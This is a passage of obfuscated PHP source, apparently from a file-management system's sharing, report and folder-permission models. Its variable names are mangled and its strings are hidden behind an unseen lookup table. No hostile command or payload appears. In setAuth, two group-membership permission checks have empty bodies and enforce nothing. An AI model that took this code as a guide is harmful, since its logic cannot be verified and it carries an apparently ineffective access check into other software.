0; $™Î š†… < count($°ğ¼×ºâ); $™Î š†…++) { $ÚÜíÌã® = $this->getInfo($°ğ¼×ºâ[$™Î š†…]); if ($ÚÜíÌã®[$ßÆğÖ¹Û[505]] == $ßÆğÖ¹Û[88]) { Model($ßÆğÖ¹Û[579])->eventShare($ÚÜíÌã®[$ßÆğÖ¹Û[411]], $ßÆğÖ¹Û[1988]); } if ($ÚÜíÌã®[$ßÆğÖ¹Û[503]] == $ßÆğÖ¹Û[88]) { Model($ßÆğÖ¹Û[579])->eventShare($ÚÜíÌã®[$ßÆğÖ¹Û[411]], $ßÆğÖ¹Û[1987]); } } return $°¢ıö÷¬; } protected function removeBySource($„óéğ‹ƒ) { $Ä×±Ä± =& $_SERVER[ïëó©ÒÚ]; $Ğö§Îæ’ = array($Ä×±Ä±[426] => array($Ä×±Ä±[427], $„óéğ‹ƒ)); $©ä¬€· = $this->field($Ä×±Ä±[498])->where($Ğö§Îæ’)->select(); $©ä¬€· = array_to_keyvalue($©ä¬€·, $Ä×±Ä±[12], $Ä×±Ä±[498]); if (!$©ä¬€·) { return; } $Ğö§Îæ’ = array($Ä×±Ä±[497] => array($Ä×±Ä±[427], $©ä¬€·)); $this->where($Ğö§Îæ’)->delete(); Model($Ä×±Ä±[611])->where($Ğö§Îæ’)->delete(); } public function listAll($±æ­òåª) { $Õ¢×¨Ò² =& $_SERVER[ïëó©ÒÚ]; $¡…ÁõÍ = array(); if ($±æ­òåª[$Õ¢×¨Ò²[1661]]) { $¡…ÁõÍ[$Õ¢×¨Ò²[1661]] = $±æ­òåª[$Õ¢×¨Ò²[1661]]; } if ($±æ­òåª[$Õ¢×¨Ò²[771]]) { $§ö¢®½ë = $±æ­òåª[$Õ¢×¨Ò²[506]] ? $±æ­òåª[$Õ¢×¨Ò²[506]] : strtotime(date($Õ¢×¨Ò²[2000])); $¡…ÁõÍ[$Õ¢×¨Ò²[200]] = array($Õ¢×¨Ò²[333], array($±æ­òåª[$Õ¢×¨Ò²[771]], $§ö¢®½ë)); } if ($±æ­òåª[$Õ¢×¨Ò²[33]]) { $¡…ÁõÍ[$±æ­òåª[$Õ¢×¨Ò²[33]]] = 1; } else { $¡…ÁõÍ[] = array($Õ¢×¨Ò²[503] => array($Õ¢×¨Ò²[1015], 0), $Õ¢×¨Ò²[505] => array($Õ¢×¨Ò²[1015], 0), $Õ¢×¨Ò²[1977] => $Õ¢×¨Ò²[1931]); } if ($±æ­òåª[$Õ¢×¨Ò²[1927]]) { $¡…ÁõÍ[] = array($Õ¢×¨Ò²[500] => $±æ­òåª[$Õ¢×¨Ò²[1927]], $Õ¢×¨Ò²[1560] => array($Õ¢×¨Ò²[383], "\x25{$±æ­òåª[$Õ¢×¨Ò²[1927]]}\x25"), $Õ¢×¨Ò²[1977] => $Õ¢×¨Ò²[1931]); } $Œİš§àĞ = $this->_makeOrder()->where($¡…ÁõÍ)->selectPage(20); if (empty($Œİš§àĞ[$Õ¢×¨Ò²[369]])) { return array(); } $this->_listDataApply($Œİš§àĞ[$Õ¢×¨Ò²[369]]); return $Œİš§àĞ; } public function listDataApply($´†“ê•Ì) { $this->_listDataApply($´†“ê•Ì); return $´†“ê•Ì; } private function _listDataApply(&$ÛãÂƒ÷ˆ) { $á´¼öÎì =& $_SERVER[ïëó©ÒÚ]; $À Òã†‡ = array_to_keyvalue($ÛãÂƒ÷ˆ, $á´¼öÎì[12], $á´¼öÎì[1661]); $È·¡œ¸ = Model($á´¼öÎì[544])->userListInfo(array_unique($À Òã†‡)); $Ô™³•¹ = array_to_keyvalue($ÛãÂƒ÷ˆ, $á´¼öÎì[12], $á´¼öÎì[411]); $…–ª§˜© = Model($á´¼öÎì[835])->sourceListInfo($Ô™³•¹, !0); foreach ($ÛãÂƒ÷ˆ as $ÄìÛûñ => &$Ó½Å©Š) { $²›¥›’å = $Ó½Å©Š[$á´¼öÎì[1661]]; $Ó½Å©Š[$á´¼öÎì[2001]] = $È·¡œ¸[$²›¥›’å] ? $È·¡œ¸[$²›¥›’å] : !1; $¹õ’ş­ù = $Ó½Å©Š[$á´¼öÎì[411]]; $Ó½Å©Š[$á´¼öÎì[86]] = $…–ª§˜©[$¹õ’ş­ù] ? $…–ª§˜©[$¹õ’ş­ù] : !1; if ($Ó½Å©Š[$á´¼öÎì[86]][$á´¼öÎì[440]] == $á´¼öÎì[88]) { unset($ÛãÂƒ÷ˆ[$ÄìÛûñ]); } if ($Ó½Å©Š[$á´¼öÎì[86]] != $á´¼öÎì[197] && !$Ó½Å©Š[$á´¼öÎì[86]]) { unset($ÛãÂƒ÷ˆ[$ÄìÛûñ]); } } unset($Ó½Å©Š); $ÛãÂƒ÷ˆ = array_values($ÛãÂƒ÷ˆ); } private function _makeOrder($íÉá©éç = '') { $»ÓïÉÏ‘ =& $_SERVER[ïëó©ÒÚ]; $±éİ÷¸¥ = array($»ÓïÉÏ‘[200], $»ÓïÉÏ‘[506], $»ÓïÉÏ‘[1990], $»ÓïÉÏ‘[1991]); $­„şğåó = array($»ÓïÉÏ‘[459] => $»ÓïÉÏ‘[460], $»ÓïÉÏ‘[461] => $»ÓïÉÏ‘[462]); $ñ¢ÌïÆ£ = Input::get($»ÓïÉÏ‘[466], $»ÓïÉÏ‘[7], $»ÓïÉÏ‘[432], $±éİ÷¸¥); $±Óë¬š = Input::get($»ÓïÉÏ‘[467], $»ÓïÉÏ‘[7], $»ÓïÉÏ‘[2002], array($»ÓïÉÏ‘[1924], $»ÓïÉÏ‘[461])); $±Óë¬š = $­„şğåó[$±Óë¬š]; $íÉá©éç = $íÉá©éç . "{$ñ¢ÌïÆ£}\x20{$±Óë¬š}"; return $this->order($íÉá©éç); } public function reportAdd($’ÇŒ‚ù×) { $¨ÉÙ =& $_SERVER[ïëó©ÒÚ]; $ã‘½ˆ™Ğ = array($¨ÉÙ[498] => $’ÇŒ‚ù×[$¨ÉÙ[498]], $¨ÉÙ[1661] => USER_ID); if (Model($¨ÉÙ[1998])->where($ã‘½ˆ™Ğ)->find()) { return !1; } $÷ŸòÍˆë = array($¨ÉÙ[498] => $’ÇŒ‚ù×[$¨ÉÙ[498]], $¨ÉÙ[1560] => $’ÇŒ‚ù×[$¨ÉÙ[1560]], $¨ÉÙ[411] => $’ÇŒ‚ù×[$¨ÉÙ[411]], $¨ÉÙ[477] => $’ÇŒ‚ù×[$¨ÉÙ[477]], $¨ÉÙ[1661] => USER_ID, $¨ÉÙ[33] => $’ÇŒ‚ù×[$¨ÉÙ[33]], $¨ÉÙ[462] => $’ÇŒ‚ù×[$¨ÉÙ[462]]); return Model($¨ÉÙ[1998])->add($÷ŸòÍˆë); } public function reportList($˜²ø×Æ) { $„û©–ÓË =& $_SERVER[ïëó©ÒÚ]; $Ù“ª™î­ = array(); if ($˜²ø×Æ[$„û©–ÓË[771]]) { $Æ´¹ğ¥‡ = $˜²ø×Æ[$„û©–ÓË[506]] ? $˜²ø×Æ[$„û©–ÓË[506]] : strtotime(date($„û©–ÓË[2000])); $Ù“ª™î­[$„û©–ÓË[200]] = array($„û©–ÓË[333], array($˜²ø×Æ[$„û©–ÓË[771]], $Æ´¹ğ¥‡)); } if (isset($˜²ø×Æ[$„û©–ÓË[33]]) && in_array($˜²ø×Æ[$„û©–ÓË[33]], array($„û©–ÓË[88], $„û©–ÓË[446], $„û©–ÓË[2003], $„û©–ÓË[2004], $„û©–ÓË[2005]))) { $Ù“ª™î­[$„û©–ÓË[33]] = $˜²ø×Æ[$„û©–ÓË[33]]; } if (isset($˜²ø×Æ[$„û©–ÓË[760]]) && in_array($˜²ø×Æ[$„û©–ÓË[760]], array($„û©–ÓË[197], $„û©–ÓË[88], $„û©–ÓË[446], $„û©–ÓË[2003]))) { $Ù“ª™î­[$„û©–ÓË[760]] = $˜²ø×Æ[$„û©–ÓË[760]]; } $ıÉñ«Ë® = Input::get($„û©–ÓË[467], $„û©–ÓË[7], $„û©–ÓË[2002], array($„û©–ÓË[1924], $„û©–ÓË[461])); $ÆÎõ©¸î = array($„û©–ÓË[459] => $„û©–ÓË[460], $„û©–ÓË[461] => $„û©–ÓË[462]); $ÁĞª±µ = $„û©–ÓË[2006] . $ÆÎõ©¸î[$ıÉñ«Ë®]; $äßº•ñš = Model($„û©–ÓË[1998])->where($Ù“ª™î­)->order($ÁĞª±µ)->selectPage(20); if (empty($äßº•ñš[$„û©–ÓË[369]])) { return array(); } $ô—ŠÕ³ = array_to_keyvalue_group($äßº•ñš[$„û©–ÓË[369]], $„û©–ÓË[760], $„û©–ÓË[498]); if (!empty($ô—ŠÕ³[0])) { $˜²ø×Æ = $ô—ŠÕ³[0]; $Ù“ª™î­ = array($„û©–ÓË[498] => array($„û©–ÓË[7], $˜²ø×Æ)); $òƒëÂëÚ = $this->where($Ù“ª™î­)->field($„û©–ÓË[498])->select(); $òƒëÂëÚ = array_to_keyvalue($òƒëÂëÚ, $„û©–ÓË[12], $„û©–ÓË[498]); $’€ï˜•Ÿ = array_diff($˜²ø×Æ, $òƒëÂëÚ); if (!empty($’€ï˜•Ÿ)) { foreach ($äßº•ñš[$„û©–ÓË[369]] as $´¿ĞŞ° => $ŸàƒşÕµ) { if (in_array($ŸàƒşÕµ[$„û©–ÓË[498]], $’€ï˜•Ÿ)) { unset($äßº•ñš[$„û©–ÓË[369]][$´¿ĞŞ°]); } } } } $this->_listDataApply($äßº•ñš[$„û©–ÓË[369]]); return $äßº•ñš; } public function reportStatus($÷’šà‚®) { $«àù¦«Ö =& $_SERVER[ïëó©ÒÚ]; $Ìˆ”ÛƒŸ = array($«àù¦«Ö[399] => $÷’šà‚®[$«àù¦«Ö[399]]); $ê’æŞ = Model($«àù¦«Ö[1998])->where($Ìˆ”ÛƒŸ)->field($«àù¦«Ö[2007])->find(); if (!$ê’æŞ) { return !1; } $ÔŠö”ƒ‹ = array($«àù¦«Ö[760] => $÷’šà‚®[$«àù¦«Ö[760]]); if ($÷’šà‚®[$«àù¦«Ö[760]] == $«àù¦«Ö[2003] && $ê’æŞ[$«àù¦«Ö[760]] == $«àù¦«Ö[2003]) { $ÔŠö”ƒ‹[$«àù¦«Ö[760]] = 0; } $¤÷ûŸ¡¦ = Model($«àù¦«Ö[1998])->where($Ìˆ”ÛƒŸ)->save($ÔŠö”ƒ‹); if ($÷’šà‚®[$«àù¦«Ö[760]] == $«àù¦«Ö[446]) { if ($ê’æŞ[$«àù¦«Ö[477]] != $«àù¦«Ö[197] && $this->shareFileMeta($ê’æŞ[$«àù¦«Ö[477]])) { $this->shareFileMeta($ê’æŞ[$«àù¦«Ö[477]], 0); } $this->remove($ê’æŞ[$«àù¦«Ö[498]]); return !0; } if ($¤÷ûŸ¡¦ && $÷’šà‚®[$«àù¦«Ö[760]] == $«àù¦«Ö[2003]) { $Ó•¨òÅ© = $ÔŠö”ƒ‹[$«àù¦«Ö[760]] == $«àù¦«Ö[2003] ? 1 : 0; $this->shareFileMeta($ê’æŞ[$«àù¦«Ö[477]], $Ó•¨òÅ©); $this->removeByFile($ê’æŞ[$«àù¦«Ö[477]]); } return $¤÷ûŸ¡¦; } private function removeByFile($şİö–ÎŸ) { $‰Ë¾ıÍÄ =& $_SERVER[ïëó©ÒÚ]; $š”æ ¦ = Model($‰Ë¾ıÍÄ[835])->where(array($‰Ë¾ıÍÄ[477] => $şİö–ÎŸ))->field($‰Ë¾ıÍÄ[411])->select(); $‡¢Æ¤œà = array_to_keyvalue($š”æ ¦, $‰Ë¾ıÍÄ[12], $‰Ë¾ıÍÄ[411]); $öÁ²Ñôä = array($‰Ë¾ıÍÄ[411] => array($‰Ë¾ıÍÄ[7], $‡¢Æ¤œà), $‰Ë¾ıÍÄ[503] => 1); $š”æ ¦ = $this->where($öÁ²Ñôä)->field($‰Ë¾ıÍÄ[498])->select(); if (empty($š”æ ¦)) { return; } $ÚÎ”›½ = array_to_keyvalue($š”æ ¦, $‰Ë¾ıÍÄ[12], $‰Ë¾ıÍÄ[498]); $this->remove($ÚÎ”›½); } private function shareFileMeta($£„ñóô¡, $Ü¤¬¦–Â = null) { $Ğé´È£’ =& $_SERVER[ïëó©ÒÚ]; $œº™— = array($Ğé´È£’[477] => $£„ñóô¡, $Ğé´È£’[94] => $Ğé´È£’[2008]); if (is_null($Ü¤¬¦–Â)) { return Model($Ğé´È£’[2009])->where($œº™—)->find(); } $œº™—[$Ğé´È£’[374]] = $Ü¤¬¦–Â; Model($Ğé´È£’[2009])->add($œº™—, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\x72\143\145\137\141\x75\x74\x68"; public function getAuth($Æ–ìã) { $¢æÔ“¸§ =& $_SERVER[ïëó©ÒÚ]; $Ğ†ìÉ¶İ = $this->sourceAuthSelect($Æ–ìã); $ÖóóÓÕÈ = array(); $š§ê¥òÓ = array(); $›ÕÇßªÏ = 2 << 25; foreach ($Ğ†ìÉ¶İ as $³Ñ™İªü) { $‹€áæğ¦ = Model($¢æÔ“¸§[516])->listData($³Ñ™İªü[$¢æÔ“¸§[1937]]); if (!$‹€áæğ¦) { continue; } $ÖóóÓÕÈ[] = $³Ñ™İªü; $—Øò…ê¦ = 0; if ($³Ñ™İªü[$¢æÔ“¸§[420]] == SourceModel::TYPE_GROUP) { $—Øò…ê¦ = $›ÕÇßªÏ * 2; } if ($³Ñ™İªü[$¢æÔ“¸§[420]] == SourceModel::TYPE_USER) { $—Øò…ê¦ = $›ÕÇßªÏ; } if ($³Ñ™İªü[$¢æÔ“¸§[420]] == SourceModel::TYPE_USER && $³Ñ™İªü[$¢æÔ“¸§[514]] == $¢æÔ“¸§[197]) { $—Øò…ê¦ = 0; } $š§ê¥òÓ[] = $‹€áæğ¦[$¢æÔ“¸§[422]] + $—Øò…ê¦; } array_multisort($š§ê¥òÓ, SORT_DESC, $ÖóóÓÕÈ); return $ÖóóÓÕÈ; } public function sourceAuthSelect($¦¢ÜÎø³) { $šôÈíå£ =& $_SERVER[ïëó©ÒÚ]; static $ÀĞ¯™ôÆ = array(); $ùò¤¢à€ = is_array($¦¢ÜÎø³) ? !1 : !0; if ($ùò¤¢à€) { $¦¢ÜÎø³ = array($¦¢ÜÎø³); } $à¢¹Š½ = array(); foreach ($¦¢ÜÎø³ as $Æ‰ü™ó) { if (isset($ÀĞ¯™ôÆ[$Æ‰ü™ó])) { $à¢¹Š½[$Æ‰ü™ó] = $ÀĞ¯™ôÆ[$Æ‰ü™ó]; } } if (count($à¢¹Š½) == count($¦¢ÜÎø³)) { return $ùò¤¢à€ ? $à¢¹Š½[$¦¢ÜÎø³[0]] : $à¢¹Š½; } $¾Ê¥û„İ = $šôÈíå£[2010]; $Ì¾©ÄüÒ = array($šôÈíå£[411] => array($šôÈíå£[7], $¦¢ÜÎø³)); $ø¿ô®¨Š = $this->field($¾Ê¥û„İ)->order($šôÈíå£[399])->where($Ì¾©ÄüÒ)->select(); $¨Úƒªàô = array_to_keyvalue_group($ø¿ô®¨Š, $šôÈíå£[411]); foreach ($¦¢ÜÎø³ as $Æ‰ü™ó) { $ÀĞ¯™ôÆ[$Æ‰ü™ó] = $¨Úƒªàô[$Æ‰ü™ó] ? $¨Úƒªàô[$Æ‰ü™ó] : array(); } if ($ùò¤¢à€) { return $ø¿ô®¨Š; } return $¨Úƒªàô; } public function setAuth($©Ò²…¶Ä, $øª¹™À¼) { $¾™ß¢ëÂ =& $_SERVER[ïëó©ÒÚ]; $ù¢¥Ïİ = Model($¾™ß¢ëÂ[1330])->sourceInfo($©Ò²…¶Ä); if (!$ù¢¥Ïİ) { return !1; } if ($ù¢¥Ïİ[$¾™ß¢ëÂ[420]] != SourceModel::TYPE_GROUP) { return !1; } $õèÑÌÖÛ = 1; $§·£×¶ = $ù¢¥Ïİ[$¾™ß¢ëÂ[514]]; if ($§·£×¶ != $õèÑÌÖÛ) { $ü ®²Œ² = array($¾™ß¢ëÂ[1833] => $§·£×¶); $ìÏÆìÅÙ = Model($¾™ß¢ëÂ[1923])->field($¾™ß¢ëÂ[1661])->where($ü ®²Œ²)->select(); $ìÏÆìÅÙ = array_to_keyvalue($ìÏÆìÅÙ, $¾™ß¢ëÂ[12], $¾™ß¢ëÂ[1661]); } $ˆœ—™í¹ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $½æßĞÓ = array(); foreach ($øª¹™À¼ as $Ì¶—¨œ©) { if (!in_array($Ì¶—¨œ©[$¾™ß¢ëÂ[420]], $ˆœ—™í¹)) { show_json(LNG($¾™ß¢ëÂ[2011]), !1); } if ($§·£×¶ != $õèÑÌÖÛ) { if ($Ì¶—¨œ©[$¾™ß¢ëÂ[420]] == SourceModel::TYPE_GROUP) { } if ($Ì¶—¨œ©[$¾™ß¢ëÂ[514]] != 0 && !in_array($Ì¶—¨œ©[$¾™ß¢ëÂ[514]], $ìÏÆìÅÙ)) { } } if ($Ì¶—¨œ©[$¾™ß¢ëÂ[514]] == 0) { $Ì¶—¨œ©[$¾™ß¢ëÂ[420]] = SourceModel::TYPE_USER; } $½æßĞÓ[] = array($¾™ß¢ëÂ[411] => $©Ò²…¶Ä, $¾™ß¢ëÂ[420] => intval($Ì¶—¨œ©[$¾™ß¢ëÂ[420]]), $¾™ß¢ëÂ[514] => intval($Ì¶—¨œ©[$¾™ß¢ëÂ[514]]), $¾™ß¢ëÂ[1937] => intval($Ì¶—¨œ©[$¾™ß¢ëÂ[1937]]) ? intval($Ì¶—¨œ©[$¾™ß¢ëÂ[1937]]) : 0, $¾™ß¢ëÂ[1993] => intval($Ì¶—¨œ©[$¾™ß¢ëÂ[1993]]) ? intval($Ì¶—¨œ©[$¾™ß¢ëÂ[1993]]) : -1); } $this->where(array($¾™ß¢ëÂ[426] => $©Ò²…¶Ä))->delete(); $this->addAll($½æßĞÓ); return !0; } public function authClear($à¿†šš¸) { $°®¤Ñæ— =& $_SERVER[ïëó©ÒÚ]; $‘¬»ø¸ø = Model($°®¤Ñæ—[1330])->sourceInfo($à¿†šš¸); $·ò”¨Ç = array($à¿†šš¸); if ($‘¬»ø¸ø[$°®¤Ñæ—[419]] == $°®¤Ñæ—[88]) { $ê®›ïæ = array($°®¤Ñæ—[599] => array($°®¤Ñæ—[559], $‘¬»ø¸ø[$°®¤Ñæ—[530]] . $à¿†šš¸ . $°®¤Ñæ—[560])); $·ò”¨Ç = Model($°®¤Ñæ—[1330])->field($°®¤Ñæ—[426])->where($ê®›ïæ)->getField($°®¤Ñæ—[411], !0); $·ò”¨Ç[] = $à¿†šš¸; } $this->where(array($°®¤Ñæ—[426] => array($°®¤Ñæ—[427], $·ò”¨Ç)))->delete(); return !0; } public function getAllChildren($Š‚Îİî) { $¡è—šçõ =& $_SERVER[ïëó©ÒÚ]; $ôîÛ£œĞ = Model($¡è—šçõ[1330])->sourceInfo($Š‚Îİî); if ($ôîÛ£œĞ[$¡è—šçõ[419]] != $¡è—šçõ[88]) { return $this->sourceListAuth(array($Š‚Îİî)); } if ($ôîÛ£œĞ[$¡è—šçõ[420]] != SourceModel::TYPE_GROUP) { return array(); } $‘ÇŠ¿‚Ÿ = 1; $¤ÎŒÃ¿… = array($Š‚Îİî); if ($ôîÛ£œĞ[$¡è—šçõ[441]] == $¡è—šçõ[197] && $ôîÛ£œĞ[$¡è—šçõ[514]] != $‘ÇŠ¿‚Ÿ) { $¤ÎŒÃ¿… = $this->groupChidldAllRootSource($ôîÛ£œĞ[$¡è—šçõ[514]]); } $è×Ø˜íò = $this->field($¡è—šçõ[411])->group($¡è—šçõ[411])->select(); $è×Ø˜íò = array_to_keyvalue($è×Ø˜íò, $¡è—šçõ[12], $¡è—šçõ[411]); if (!$è×Ø˜íò) { return array(); } $½«Ö÷ŠŞ = $¡è—šçõ[2012]; $¸ºÛ®óÀ = array($¡è—šçõ[411] => array($¡è—šçõ[7], $è×Ø˜íò), $¡è—šçõ[440] => $¡è—šçõ[197]); $Ú¤˜±úŸ = Model($¡è—šçõ[835])->field($½«Ö÷ŠŞ)->where($¸ºÛ®óÀ)->select(); $Šî²ˆò˜ = array($Š‚Îİî); foreach ($Ú¤˜±úŸ as $‚ëøŞ¦Ø) { foreach ($¤ÎŒÃ¿… as $ğ‹ùíÍú) { $Àø‰¼†Å = $¡è—šçõ[50] . $ğ‹ùíÍú . $¡è—šçõ[50]; $À¿ñÊ¥… = $‚ëøŞ¦Ø[$¡è—šçõ[530]] . $‚ëøŞ¦Ø[$¡è—šçõ[411]] . $¡è—šçõ[50]; if (strstr($À¿ñÊ¥…, $Àø‰¼†Å)) { $Šî²ˆò˜[] = $‚ëøŞ¦Ø[$¡è—šçõ[411]]; break; } } } return $this->sourceListAuth($Šî²ˆò˜); } private function sourceListAuth($–ì‘ˆÈÅ) { $…€€ÎúÒ =& $_SERVER[ïëó©ÒÚ]; $ëšñı˜ = Model($…€€ÎúÒ[1330])->sourceListInfo($–ì‘ˆÈÅ, !0); $éãäşğ = $this->sourceAuthSelect($–ì‘ˆÈÅ); $Ü„ç¹«˜ = array(); $æ™Âıä™ = array(); foreach ($ëšñı˜ as $äİ¬Ï­Ç) { unset($äİ¬Ï­Ç[$…€€ÎúÒ[465]]); unset($äİ¬Ï­Ç[$…€€ÎúÒ[463]]); unset($äİ¬Ï­Ç[$…€€ÎúÒ[422]]); unset($äİ¬Ï­Ç[$…€€ÎúÒ[86]]); $¯œÀß¢¼ = $éãäşğ[$äİ¬Ï­Ç[$…€€ÎúÒ[411]]]; if (!$¯œÀß¢¼) { continue; } $äİ¬Ï­Ç[$…€€ÎúÒ[2013]] = $this->authTargetInfo($¯œÀß¢¼); $äİ¬Ï­Ç[$…€€ÎúÒ[528]] = rtrim($äİ¬Ï­Ç[$…€€ÎúÒ[534]], $…€€ÎúÒ[8]) . $…€€ÎúÒ[8] . ltrim($äİ¬Ï­Ç[$…€€ÎúÒ[528]], $…€€ÎúÒ[8]); $Ü„ç¹«˜[] = $äİ¬Ï­Ç; $ßê£ã• = count(explode($…€€ÎúÒ[8], trim($äİ¬Ï­Ç[$…€€ÎúÒ[528]], $…€€ÎúÒ[8]))); $æ™Âıä™[] = $ßê£ã• + ($äİ¬Ï­Ç[$…€€ÎúÒ[33]] == $…€€ÎúÒ[75] ? 0 : 1000); } array_multisort($æ™Âıä™, SORT_ASC, $Ü„ç¹«˜); return $Ü„ç¹«˜; } private function groupChidldAllRootSource($•Ó“˜§) { $Ëú“ªı© =& $_SERVER[ïëó©ÒÚ]; $Ã†³ú” = Model($Ëú“ªı©[2014])->groupChildrenAll($•Ó“˜§); $àÖ½îˆã = array($Ëú“ªı©[441] => 0, $Ëú“ªı©[514] => array($Ëú“ªı©[7], $Ã†³ú”), $Ëú“ªı©[420] => SourceModel::TYPE_GROUP); $ƒ½æ¢°† = Model($Ëú“ªı©[835])->field($Ëú“ªı©[411])->where($àÖ½îˆã)->select(); $ƒ½æ¢°† = array_to_keyvalue($ƒ½æ¢°†, $Ëú“ªı©[12], $Ëú“ªı©[411]); return $ƒ½æ¢°†; } private function authTargetInfo($Úî¦Ú) { $¡©²÷Ç =& $_SERVER[ïëó©ÒÚ]; $ÚğöŞ¬È = array(); $©ùŒ¨µº = array(); $™“€öÂ· = 2 << 25; foreach ($Úî¦Ú as $ªÂ¹§ƒ) { $á×Û‹ùÄ = Model($¡©²÷Ç[516])->listData($ªÂ¹§ƒ[$¡©²÷Ç[1937]]); if (!$á×Û‹ùÄ) { continue; } if ($ªÂ¹§ƒ[$¡©²÷Ç[420]] == SourceModel::TYPE_USER) { $‘ÔÑ‡ì† = Model($¡©²÷Ç[522])->getInfoSimpleOuter($ªÂ¹§ƒ[$¡©²÷Ç[514]]); if ($‘ÔÑ‡ì†[$¡©²÷Ç[1661]] == $¡©²÷Ç[1193]) { continue; } if ($‘ÔÑ‡ì†[$¡©²÷Ç[1661]] == $¡©²÷Ç[197]) { $‘ÔÑ‡ì†[$¡©²÷Ç[32]] = LNG($¡©²÷Ç[2015]); } } else { $‘ÔÑ‡ì† = Model($¡©²÷Ç[531])->getInfoSimple($ªÂ¹§ƒ[$¡©²÷Ç[514]]); } if (!$‘ÔÑ‡ì†) { continue; } $‘ÔÑ‡ì†[$¡©²÷Ç[476]] = $á×Û‹ùÄ; $ÚğöŞ¬È[] = $‘ÔÑ‡ì†; $Å³İ÷ış = 0; if ($ªÂ¹§ƒ[$¡©²÷Ç[420]] == SourceModel::TYPE_GROUP) { $Å³İ÷ış = $™“€öÂ· * 2; } if ($ªÂ¹§ƒ[$¡©²÷Ç[420]] == SourceModel::TYPE_USER) { $Å³İ÷ış = $™“€öÂ·; } if ($ªÂ¹§ƒ[$¡©²÷Ç[420]] == SourceModel::TYPE_USER && $ªÂ¹§ƒ[$¡©²÷Ç[514]] == $¡©²÷Ç[197]) { $Å³İ÷ış = 0; } $©ùŒ¨µº[] = $á×Û‹ùÄ[$¡©²÷Ç[422]] + $Å³İ÷ış; } array_multisort($©ùŒ¨µº, SORT_DESC, $ÚğöŞ¬È); return $ÚğöŞ¬È; } public function getAllChildrenByUser($²İ«§î, $Ÿ«¯·Ô») { $®ä¿£êà =& $_SERVER[ïëó©ÒÚ]; $Ş³‚‘Óş = Model($®ä¿£êà[544])->getInfo($Ÿ«¯·Ô»); if (!$Ÿ«¯·Ô» || !$²İ«§î || !$Ş³‚‘Óş) { return array(); } $©Âù€‡Ï = Model($®ä¿£êà[1330])->sourceInfo($²İ«§î); $ƒÑäÕî¤ = array(); $”ùöšü” = 1; if ($©Âù€‡Ï[$®ä¿£êà[441]] == $®ä¿£êà[197] && $©Âù€‡Ï[$®ä¿£êà[514]] != $”ùöšü” && $this->groupContainUser($©Âù€‡Ï[$®ä¿£êà[514]], $Ÿ«¯·Ô»)) { foreach ($Ş³‚‘Óş[$®ä¿£êà[2016]] as $…ı‹´åï) { $»—ÄÊÄ© = Model($®ä¿£êà[531])->getInfo($…ı‹´åï[$®ä¿£êà[1833]]); $¸íïÆÊ = Model($®ä¿£êà[544])->getInfoSimpleOuter($Ÿ«¯·Ô»); $¸íïÆÊ[$®ä¿£êà[476]] = $…ı‹´åï[$®ä¿£êà[422]]; if (Model($®ä¿£êà[516])->authCheckAction($…ı‹´åï[$®ä¿£êà[422]][$®ä¿£êà[422]], $®ä¿£êà[1854])) { continue; } $ß²‚Á¿ï = array($®ä¿£êà[32] => $®ä¿£êà[1609] . $»—ÄÊÄ©[$®ä¿£êà[32]], $®ä¿£êà[411] => $»—ÄÊÄ©[$®ä¿£êà[86]][$®ä¿£êà[411]], $®ä¿£êà[84] => KodIO::make($»—ÄÊÄ©[$®ä¿£êà[86]][$®ä¿£êà[411]]), $®ä¿£êà[441] => $®ä¿£êà[197], $®ä¿£êà[420] => $®ä¿£êà[524], $®ä¿£êà[33] => $®ä¿£êà[563], $®ä¿£êà[528] => $»—ÄÊÄ©[$®ä¿£êà[535]], $®ä¿£êà[1833] => $»—ÄÊÄ©[$®ä¿£êà[1833]], $®ä¿£êà[532] => $»—ÄÊÄ©[$®ä¿£êà[441]], $®ä¿£êà[2013] => array($¸íïÆÊ)); $ƒÑäÕî¤[$ß²‚Á¿ï[$®ä¿£êà[411]]] = $ß²‚Á¿ï; } } $¸¸×‹ÛÑ = array(); $ŸÔƒá¨ß = $this->getAllChildren($²İ«§î); foreach ($ŸÔƒá¨ß as $ğ¥»ãÛ±) { $Ò˜ªá… = !1; foreach ($ğ¥»ãÛ±[$®ä¿£êà[2013]] as $¥§ûÂ­ˆ) { if ($¥§ûÂ­ˆ[$®ä¿£êà[1661]]) { if ($¥§ûÂ­ˆ[$®ä¿£êà[1661]] == $Ÿ«¯·Ô») { $Ò˜ªá… = !0; break; } } if ($¥§ûÂ­ˆ[$®ä¿£êà[1833]]) { if ($this->groupContainUser($¥§ûÂ­ˆ[$®ä¿£êà[1833]], $Ÿ«¯·Ô»)) { $Ò˜ªá… = !0; break; } } } if ($Ò˜ªá…) { $¸¸×‹ÛÑ[] = $ğ¥»ãÛ±; } $ñ’Ç¶¤Î = $ğ¥»ãÛ±[$®ä¿£êà[411]]; if (isset($ƒÑäÕî¤[$ñ’Ç¶¤Î])) { $ğ¥»ãÛ±[$®ä¿£êà[2013]][] = $ƒÑäÕî¤[$ñ’Ç¶¤Î][0]; $ƒÑäÕî¤[$ñ’Ç¶¤Î] = !1; } } $ƒÑäÕî¤ = array_filter(array_values($ƒÑäÕî¤)); $¸¸×‹ÛÑ = array_merge($ƒÑäÕî¤, $¸¸×‹ÛÑ); return $¸¸×‹ÛÑ; } public function setAllChildrenByUser($ª€Øå´ù, $ÆğÃïÛõ, $ş’áÍìû) { $Ğî—Âçç =& $_SERVER[ïëó©ÒÚ]; $ ôÆ¿—ã = $this->getAllChildrenByUser($ª€Øå´ù, $ÆğÃïÛõ); if (!$ş’áÍìû || !$ ôÆ¿—ã) { return !1; } foreach ($ ôÆ¿—ã as $¢íãé‰ ) { $ÛïÌ¾ûş = array(); foreach ($¢íãé‰ [$Ğî—Âçç[2013]] as $˜ŒÔ…è®) { $ß™·şÜ‹ = $˜ŒÔ…è®[$Ğî—Âçç[476]]; $ÌÏ÷÷ğÈ = $˜ŒÔ…è®[$Ğî—Âçç[1661]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $î½›Ü“ = $˜ŒÔ…è®[$Ğî—Âçç[1661]] ? $˜ŒÔ…è®[$Ğî—Âçç[1661]] : $˜ŒÔ…è®[$Ğî—Âçç[1833]]; if ($˜ŒÔ…è®[$Ğî—Âçç[1661]] && $˜ŒÔ…è®[$Ğî—Âçç[1661]] == $ÆğÃïÛõ) { continue; } $ÛïÌ¾ûş[] = array($Ğî—Âçç[411] => $¢íãé‰ [$Ğî—Âçç[411]], $Ğî—Âçç[420] => $ÌÏ÷÷ğÈ, 